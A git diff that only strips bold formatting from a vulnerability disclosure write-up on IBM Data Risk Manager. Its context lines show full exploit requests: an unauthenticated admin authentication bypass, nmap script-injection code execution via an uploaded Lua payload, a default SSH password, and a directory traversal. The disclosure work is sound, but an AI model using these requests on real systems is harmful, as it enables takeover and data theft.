@@ -42,7 +42,7 @@ It should be noted that IBM offers no bounties on their "bug bounty program", ju
 ![Kudos](./kudos.jpeg)
 
 In any case, I did not ask or expect a bounty since I do not have a HackerOne account and I don't agree with HackerOne's or IBM's disclosure terms there. 
-**I simply wanted to disclose it to IBM responsibly and let them fix it**.
+I simply wanted to disclose it to IBM responsibly and let them fix it.
 
 ### So many questions...
 IDRM is an enterprise security product that handles very sensitive information. A compromise of such product might lead to a full scale company compromise, as the tool has credentials to access other security tools, not to mention it contains information about critical vulnerabilities that affect the company.
@@ -105,7 +105,7 @@ IDRM has an API endpoint at */albatross/saml/idpSelection* that associates an ID
 
 ```
 
-As it can be seen in the code above, **this method accepts an arbitrary *sessionId* and *username* parameters from the HTTP request**, and if *username* exists on the application's user database, **it then associates that *sessionId* to the *username***.  
+As it can be seen in the code above, this method accepts an arbitrary *sessionId* and *username* parameters from the HTTP request, and if *username* exists on the application's user database, it then associates that *sessionId* to the *username*.  
 This can be achieved by an unauthenticated attacker with the following request:
 ```
 GET /albatross/saml/idpSelection?id=SOMETHING&userName=admin
@@ -146,7 +146,7 @@ The API endpoint */albatross/user/login* is handled by the following method (onl
     }
 ```
 
-The method listed above takes the *username* and *sessionId* parameters, and checks **if *username* exists in the database and *sessionId* is associated with that *username***. If it is, the application **returns a newly generated random password for that username**.  
+The method listed above takes the *username* and *sessionId* parameters, and checks if *username* exists in the database and *sessionId* is associated with that *username*. If it is, the application returns a newly generated random password for that username.  
 In the previous request, the "*admin"* user was associated with the *sessionId "SOMETHING"*. So now if we perform the following request:
 ```
 POST /albatross/user/login HTTP/1.1
@@ -220,7 +220,7 @@ To which the server responds with:
 {"httpStatus":"200","serverCode":"2001","requestedUrl":"https://10.0.10.25:8443/albatross/user/login","data":{"access_token":"3b5b0fa6-2d46-4104-ba38-54a077d05a93","token_type":"bearer","expires_in":28799,"scope":"read write"}}
 ```
 
-**Success!** We now have a valid Bearer administrative token that can be used to access various API. It's also possible to login as a normal web user on the */albatross/login* endpoint, which will yield an authenticated cookie instead of a token, allowing access to the web administration console. In any case, as this shows, **authentication is now completely bypassed and we have full administrative access to IDRM**.
+Success! We now have a valid Bearer administrative token that can be used to access various API. It's also possible to login as a normal web user on the */albatross/login* endpoint, which will yield an authenticated cookie instead of a token, allowing access to the web administration console. In any case, as this shows, authentication is now completely bypassed and we have full administrative access to IDRM.
 
 It should be noted that this is a destructive action - the previous admin password will be invalid, and only the new password which is generated above can be used to login as an admin. So this works a bit like a *"password reset"*, even though it is not named as such.
 
@@ -236,7 +236,7 @@ It should be noted that this is a destructive action - the previous admin passwo
   * IBM Data Risk Manager 2.0.4 to 2.0.6 likely to be vulnerable
 
 #### Details:
-IDRM exposes an API at */albatross/restAPI/v2/nmap/run/scan* that **allows an authenticated user to perform nmap scans**. The call stack and relevant code is pasted below:
+IDRM exposes an API at */albatross/restAPI/v2/nmap/run/scan* that allows an authenticated user to perform nmap scans. The call stack and relevant code is pasted below:
 
 ```java
 	@RequestMapping(value={"/run/nmap/scan"}, method={RequestMethod.POST})
@@ -270,9 +270,9 @@ IDRM exposes an API at */albatross/restAPI/v2/nmap/run/scan* that **allows an au
           (...)
         }
 ```          
-As listed in [GTFObins](https://gtfobins.github.io/gtfobins/nmap), **having access to nmap allows running arbitrary commands if we can upload a script file** and then pass that as an argument to nmap with *"--script=<FILE\>"*. Looking at the code above, *ipAddress* looks like a good candidate for this.
+As listed in [GTFObins](https://gtfobins.github.io/gtfobins/nmap), having access to nmap allows running arbitrary commands if we can upload a script file and then pass that as an argument to nmap with *"--script=<FILE\>"*. Looking at the code above, *ipAddress* looks like a good candidate for this.
 
-However, to achieve code execution in this way we still need to upload a file. **Luckily, there's a method that processes patch files and accepts arbitrary data, saving it to *"/home/a3user/agile3/patches/<FILE\>"***. The method is too long and verbose to paste here, but it is supposed to process a patch file for execution. However, at least in version 2.0.2, there's a number of bugs that prevent this from happening. Luckily, the file is still uploaded and not deleted. 
+However, to achieve code execution in this way we still need to upload a file. Luckily, there's a method that processes patch files and accepts arbitrary data, saving it to *"/home/a3user/agile3/patches/<FILE\>"*. The method is too long and verbose to paste here, but it is supposed to process a patch file for execution. However, at least in version 2.0.2, there's a number of bugs that prevent this from happening. Luckily, the file is still uploaded and not deleted. 
 We simple need to send the following request to upload it:
 ```
 POST /albatross/upload/patch HTTP/1.1
@@ -321,7 +321,7 @@ Content-Disposition: form-data; name="ipAddress"
 --script=/home/a3user/agile3/patches/owned.enc
 --_Part_841_3176682485_2250831758--
 ```
-**This will execute *"nmap --script=/home/a3user/agile3/patches/owned.enc"* and run our command**:
+This will execute *"nmap --script=/home/a3user/agile3/patches/owned.enc"* and run our command:
 ```
 [a3user@idrm-server ~]$ cat /home/a3user/agile3/patches/owned.enc
 os.execute("/usr/bin/whoami > /tmp/testing")
@@ -342,7 +342,7 @@ Note that all of these requests require an authenticated session as an administr
   * IBM Data Risk Manager 2.0.4 to 2.0.6 likely to be vulnerable
 
 #### Details:
-The administrative user in the IDRM virtual appliance is *"a3user"*. **This user is allowed to login via SSH and run sudo commands, and it is set up with a default password of *"idrm"***.  
+The administrative user in the IDRM virtual appliance is *"a3user"*. This user is allowed to login via SSH and run sudo commands, and it is set up with a default password of *"idrm"*.  
 
 When combined with vulnerabilities #1 and #2, this allows an unauthenticated attacker to achieve remote code execution as root on the IDRM virtual appliance, leading to complete system compromise.  
 
@@ -360,7 +360,7 @@ While IDRM forces the administrative user of the web interface (*"admin"*) to ch
 
 #### Details:
 
-IDRM exposes an API at */albatross/eurekaservice/fetchLogFiles* that allows an authenticated user to download log files from the system. However, **the *logFileNameList* parameter contains a basic directory traversal flaw that allows an attacker to download any file off the system**.  
+IDRM exposes an API at */albatross/eurekaservice/fetchLogFiles* that allows an authenticated user to download log files from the system. However, the *logFileNameList* parameter contains a basic directory traversal flaw that allows an attacker to download any file off the system.  
 The code path is convoluted, and won't be shown here for brevity, but exploitation (and finding this flaw) is very simple:
 
 ```
